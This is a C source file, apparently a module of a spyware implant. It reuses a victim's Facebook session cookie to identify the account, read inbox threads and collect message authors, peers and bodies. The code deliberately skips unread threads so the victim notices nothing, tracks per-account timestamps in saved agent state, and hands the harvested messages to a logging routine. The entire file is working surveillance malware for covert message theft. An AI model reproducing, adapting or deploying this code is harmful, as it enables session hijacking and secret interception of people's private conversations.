#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "..\common.h"
#include "..\LOG.h"
#include "SocialMain.h"
#include "NetworkHandler.h"

#define FB_THREAD_IDENTIFIER "\\/messages\\/?action=read&amp;tid="
#define FB_THREAD_AUTHOR_IDENTIFIER "class=\\\"authors\\\">"
#define FB_THREAD_STATUS_IDENTIFIER "class=\\\"threadRow noDraft "
#define FB_MESSAGE_TSTAMP_IDENTIFIER "data-utime=\\\""
#define FB_MESSAGE_BODY_IDENTIFIER "div class=\\\"content noh\\\" id=\\\""
#define FB_MESSAGE_AUTHOR_IDENTIFIER "\\u003C\\/a>\\u003C\\/strong>"
#define FB_NEW_LINE "\\u003Cbr \\/> "
#define FACEBOOK_THREAD_LIMIT 40
#define MAX_FACEBOOK_ACCOUNTS 500 
#define FB_INVALID_TSTAMP 0xFFFFFFFF

extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi

typedef struct {
	char user[48];
	DWORD tstamp;
} last_tstamp_struct;
last_tstamp_struct *last_tstamp_array = NULL;

DWORD GetLastFBTstamp(char *user)
{
	DWORD i;

	// Se e' la prima volta che viene chiamato 
	// alloca l'array
	if (!last_tstamp_array) {
		last_tstamp_array = (last_tstamp_struct *)calloc(MAX_FACEBOOK_ACCOUNTS, sizeof(last_tstamp_struct));
		if (!last_tstamp_array)
			return FB_INVALID_TSTAMP;
		Log_RestoreAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
	}
	if (!user || !user[0])
		return FB_INVALID_TSTAMP;

	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
		if (last_tstamp_array[i].user[0] == 0)
			return 0;
		if (!strcmp(user, last_tstamp_array[i].user))
			return last_tstamp_array[i].tstamp;
	}
	return FB_INVALID_TSTAMP;
}

void SetLastFBTstamp(char *user, DWORD tstamp)
{
	DWORD i;

	if (!user || !user[0] || tstamp==0)
		return;

	if (!last_tstamp_array && GetLastFBTstamp(user)==FB_INVALID_TSTAMP)
		return;

	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
		if (last_tstamp_array[i].user[0] == 0)
			break;
		if (!strcmp(user, last_tstamp_array[i].user)) {
			if (tstamp > last_tstamp_array[i].tstamp) {
				last_tstamp_array[i].tstamp = tstamp;
				Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
			}
			return;
		}
	}

	for (i=0; i<MAX_FACEBOOK_ACCOUNTS; i++) {
		// Lo scrive nella prima entry libera
		if (last_tstamp_array[i].user[0] == 0) {
			_snprintf_s(last_tstamp_array[i].user, _TRUNCATE, "%s", user);		
			last_tstamp_array[i].tstamp = tstamp;
			Log_SaveAgentState(PM_SOCIALAGENT_FB, (BYTE *)last_tstamp_array, MAX_FACEBOOK_ACCOUNTS*sizeof(last_tstamp_struct));
			return;
		}
	}
}

DWORD HandleFaceBook(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	BYTE *r_buffer_inner = NULL;
	DWORD response_len, dummy;
	WCHAR url[256];
	BYTE *parser1, *parser2;
	BYTE *parser_inner1, *parser_inner2;
	WCHAR fb_request[256];
	char peers[256];
	char author[256];
	char tstamp[11];
	DWORD act_tstamp;
	DWORD last_tstamp = 0;
	char *msg_body = NULL;
	DWORD msg_body_size, msg_part_size;
	char user[256];

	CheckProcessStatus();

	if (!bPM_IMStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	
	// Identifica l'utente
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 80, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	parser1 = (BYTE *)strstr((char *)r_buffer, "\"user\":\"");
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser1 += strlen("\"user\":\"");
	parser2 = (BYTE *)strchr((char *)parser1, '\"');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	sprintf_s(user, "%s", parser1);
	SAFE_FREE(r_buffer);

	// Torna utente "0" se non siamo loggati
	if (!strcmp(user, "0"))
		return SOCIAL_REQUEST_BAD_COOKIE;

	// Carica dal file il last time stamp per questo utente
	last_tstamp = GetLastFBTstamp(user);
	if (last_tstamp == FB_INVALID_TSTAMP)
		return SOCIAL_REQUEST_BAD_COOKIE;

	// Chiede la lista dei thread
	swprintf_s(fb_request, L"ajax/messaging/async.php?sk=inbox&offset=0&limit=%d&__a=1", FACEBOOK_THREAD_LIMIT);
	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", fb_request, 80, NULL, 0, &r_buffer, &response_len, cookie);
	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = r_buffer;
	for (;;) {
		CheckProcessStatus();
		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_STATUS_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_THREAD_STATUS_IDENTIFIER);
		// Salta i thread unread per non cambiare il loro stato!!!!
		if(!strncmp((char *)parser1, "unread", strlen("unread")))
			continue;

		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_THREAD_IDENTIFIER);
		parser2 = (BYTE *)strstr((char *)parser1, "\\\" ");
		if (!parser2)
			break;
		*parser2 = 0;
		urldecode((char *)parser1);
		// Se voglio andare piu' indietro aggiungo alla richiesta...per ora pero' va bene cosi'
		// &thread_offset=0&num_msgs=60
		swprintf_s(url, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1", parser1);
		parser1 = parser2 + 1;

		parser1 = (BYTE *)strstr((char *)parser1, FB_MESSAGE_TSTAMP_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER);
		memset(tstamp, 0, sizeof(tstamp));
		memcpy(tstamp, parser1, 10);
		act_tstamp = atoi(tstamp);
		if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
			continue;

		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_AUTHOR_IDENTIFIER);
		if (!parser1)
			break;
		parser1 += strlen(FB_THREAD_AUTHOR_IDENTIFIER);
		parser2 = (BYTE *)strstr((char *)parser1, "\\u003C\\/");
		if (!parser2)
			break;
		*parser2 = 0;
		sprintf_s(peers, "%s", parser1);
		parser1 = parser2 + 1;

		// Pe ogni thread chiede tutti i rispettivi messaggi
		ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", url, 80, NULL, 0, &r_buffer_inner, &dummy, cookie);
		if (ret_val != SOCIAL_REQUEST_SUCCESS) {
			SAFE_FREE(r_buffer);
			return ret_val;
		}
		parser_inner1 = r_buffer_inner;
		for (;;) {			
			CheckProcessStatus();
			parser_inner1 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_TSTAMP_IDENTIFIER);
			if (!parser_inner1)
				break;
			parser_inner1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER);
			memset(tstamp, 0, sizeof(tstamp));
			memcpy(tstamp, parser_inner1, 10);
			act_tstamp = atoi(tstamp);
			if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
				continue;
			SetLastFBTstamp(user, act_tstamp);

			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_AUTHOR_IDENTIFIER);
			if (!parser_inner2)
				break;
			*parser_inner2 = 0;
			parser_inner1 = parser_inner2;
			for (;*(parser_inner1) != '>'; parser_inner1--);
			parser_inner1++;
			sprintf_s(author, "%s", parser_inner1);
			parser_inner1 = parser_inner2 + 1;

			// Cicla per tutti i possibili body del messaggio
			SAFE_FREE(msg_body);
			msg_body_size = 0;
			for (;;) {
				BYTE *tmp_ptr1, *tmp_ptr2;
				tmp_ptr1 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_BODY_IDENTIFIER);
				if (!tmp_ptr1)
					break;
				// Non ci sono piu' body (c'e' gia' un nuovo timestamp)
				tmp_ptr2 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_TSTAMP_IDENTIFIER);
				if (tmp_ptr2 && tmp_ptr2<tmp_ptr1)
					break;
				parser_inner1 = tmp_ptr1;
				parser_inner1 = (BYTE *)strstr((char *)parser_inner1, "p>");
				if (!parser_inner1)
					break;
				parser_inner1 += strlen("p>");
				parser_inner2 = (BYTE *)strstr((char *)parser_inner1, "\\u003C\\/p>");
				if (!parser_inner2)
					break;
				*parser_inner2 = 0;

				msg_part_size = strlen((char *)parser_inner1);
				tmp_ptr1 = (BYTE *)realloc(msg_body, msg_body_size + msg_part_size + strlen(FB_NEW_LINE) + sizeof(WCHAR));
				if (!tmp_ptr1)
					break;
				// Se non e' il primo body, accodiamo un "a capo"
				if (msg_body) {
					memcpy(tmp_ptr1 + msg_body_size, FB_NEW_LINE, strlen(FB_NEW_LINE));
					msg_body_size += strlen(FB_NEW_LINE);
				}

				msg_body = (char *)tmp_ptr1;
				memcpy(msg_body + msg_body_size, parser_inner1, msg_part_size);
				msg_body_size += msg_part_size;
				// Null-termina sempre il messaggio
				memset(msg_body + msg_body_size, 0, sizeof(WCHAR));

				parser_inner1 = parser_inner2 + 1;
			}

			// Vede se deve mettersi in pausa o uscire
			CheckProcessStatus();

			if (msg_body) {
				struct tm tstamp;
				_gmtime32_s(&tstamp, (__time32_t *)&act_tstamp);
				tstamp.tm_year += 1900;
				tstamp.tm_mon++;
				LogSocialIMMessageA("Facebook", "", peers, author, msg_body, &tstamp);
				SAFE_FREE(msg_body);
			} else
				break;
		}
		SAFE_FREE(r_buffer_inner);
	}

	SAFE_FREE(r_buffer);
	CheckProcessStatus();

	return SOCIAL_REQUEST_SUCCESS;
}

